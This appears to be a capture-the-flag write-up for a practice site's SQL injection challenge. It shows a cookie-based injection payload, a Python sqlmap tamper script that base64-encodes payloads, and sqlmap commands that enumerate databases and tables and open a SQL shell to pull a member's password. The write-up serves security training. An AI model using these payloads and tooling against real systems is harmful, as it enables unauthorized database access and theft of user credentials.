# Challenge #2 - Poema Reading club 6

## Objectives

- You want to exploit an Error based SQL injection manually in order to dump data from the database. You will have to first determine the remote DB version, current user and selected database. Then proceed to schema enumeration and data dump
- Find out Ruud password in the database

## Hints

- MySQL
- Cookie Manipulation

## What you will learn

- How to find SQL injection vulnerabilities manually
- How to determine if a SQL injection is of type "blind" or "error based"
- How to extract information from a database using error based techniques and only a web browser

## Steps

The vulnerable point in on the cookie userchl2_info. Open any page and look on burp suite for the cookie.

Target url:
http://2.challenge.sqli.site/index.php

```
userchl2_info=%7B%22last_book%22%3A%22MQ%3D%3D%22%2C%22userchl2%22%3A%22%22%7D
```

Decoding the text from URL to see it in clean text.

```
userchl2_info={"last_book":"MQ==","userchl2":""}
```

Decoding MQ== from base64 you will get the number 1.

Replace the cookie for the payload below.

```
userchl2_info={"last_book":"' or '1'='1","userchl2":""}
```

Now, intead of sending 1, you will send "' or '1'='1" as last book.

Observe that the return message now has an mysql error message.

```
mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <b>/var/www/challenge.sqli.site/2/sidebar.php
```

To send this payload to SQLMap we will need a special tamper to convert the payload to base64, rebuild the cookie json and url encode it.

Create a file tamper.py with the code below.

```
#!/usr/bin/env python
import base64
import urllib.parse

def tamper(payload, **kwargs):
    params = '{"last_book":"%s","userchl2":""}' % base64.b64encode(payload.encode()).decode()
    data = urllib.parse.quote_plus(params)
    return data
```

Create an *empty* file __init__.py in the same directory of the tamper.py

In the command below, replace the session cookie sid and send to SQLMap.

```
sqlmap -u "http://2.challenge.sqli.site/index.php" --cookie="sid=e75aa278-1b4e-11ec-b0bf-710c194eec7f; userchl2_info=*" --skip='PHPSESSID' --batch  --thread 10  --dbms='mysql' --level=3 --tamper tamper.py --technique T
```

After a few momments SQLMap will return the vulnerable parameter.

```
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 977 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: Cookie: sid=e75aa278-1b4e-11ec-b0bf-710c194eec7f; userchl2_info=(CASE WHEN (5925=5925) THEN SLEEP(5) ELSE 5925 END)
---
```

List all databases.

```
sqlmap -u "http://2.challenge.sqli.site/index.php" --cookie="sid=e75aa278-1b4e-11ec-b0bf-710c194eec7f; userchl2_info=*" --skip='PHPSESSID' --batch  --thread 10  --dbms='mysql' --level=3 --tamper tamper.py --technique T --dbs

available databases [2]:
[*] databasechl2
[*] information_schema
```

List all tables from databasechl2.

```
sqlmap -u "http://2.challenge.sqli.site/index.php" --cookie="sid=e75aa278-1b4e-11ec-b0bf-710c194eec7f; userchl2_info=*" --skip='PHPSESSID' --batch  --thread 10  --dbms='mysql' --level=3 --tamper tamper.py --technique T -D databasechl2 --tables

Database: databasechl2
[2 tables]
+--------------+
| books        |
| club_members |
+--------------+
```

This SQL injection is very slow, so I choose enter on the os-shell and send a SQL command to retrieve only the Ruud user.

```
sqlmap -u "http://2.challenge.sqli.site/index.php" --cookie="sid=e75aa278-1b4e-11ec-b0bf-710c194eec7f; userchl2_info=*" --skip='PHPSESSID' --batch  --thread 10  --dbms='mysql' --level=3 --tamper tamper.py --technique T --sql-shell

sql-shell> select * from databasechl2.club_members where name = 'Ruud';

retrieved: 12
retrieved: Ruud
retrieved: HOO93MSH6EK
retrieved: feugiat@nonsollicitudin.org
retrieved: 73544
```